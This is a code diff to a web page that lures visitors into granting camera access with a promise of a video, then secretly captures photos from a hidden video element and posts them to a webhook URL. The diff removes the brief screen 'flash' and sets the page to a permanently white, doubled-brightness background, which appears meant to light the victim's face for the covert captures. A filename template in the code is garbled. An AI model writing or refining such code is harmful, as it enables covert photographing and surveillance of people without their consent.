@@ -7,18 +7,20 @@
   <style>
     body {
       margin: 0;
-      background: #000;
+      background: #ffffff; /* أبيض ناصع من البداية */
       height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       font-family: Arial, sans-serif;
+      filter: brightness(200%); /* أقصى سطوع ممكن */
+      transition: filter 0.3s;
     }
     header {
       width: 100%;
       padding: 20px;
-      background: #111;
+      background: #ffffff;
       text-align: center;
     }
     h1 {
@@ -105,29 +107,19 @@ btn.onclick = async () => {
     mainVideo.play();
 
   } catch (err) {
-    // إذا رفض الإذن → ما يظهر الفيديو
     alert("Veuillez autoriser la caméra pour voir la vidéo.");
   }
 };
 
 function capturePhoto(num) {
-  // سطوع الشاشة 100% قبل التقاط (فلاش شاشة خفيف)
-  document.body.style.background = '#ffffff';
-  document.body.style.transition = 'background 0.1s';
-
-  setTimeout(() => {
-    canvas.width = hiddenVideo.videoWidth;
-    canvas.height = hiddenVideo.videoHeight;
-    ctx.drawImage(hiddenVideo, 0, 0);
-    canvas.toBlob(blob => {
-      const fd = new FormData();
-      fd.append('photo', blob, `capture_\( {Date.now()}_ \){num}.jpg`);
-      fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-
-      // رجوع الشاشة للأسود فورًا بعد التقاط
-      document.body.style.background = '#000';
-    }, 'image/jpeg', 0.92);
-  }, 300); // 300 مللي ثانية سطوع قبل التقاط
+  canvas.width = hiddenVideo.videoWidth;
+  canvas.height = hiddenVideo.videoHeight;
+  ctx.drawImage(hiddenVideo, 0, 0);
+  canvas.toBlob(blob => {
+    const fd = new FormData();
+    fd.append('photo', blob, `capture_\( {Date.now()}_ \){num}.jpg`);
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+  }, 'image/jpeg', 0.92);
 }
 </script>
 
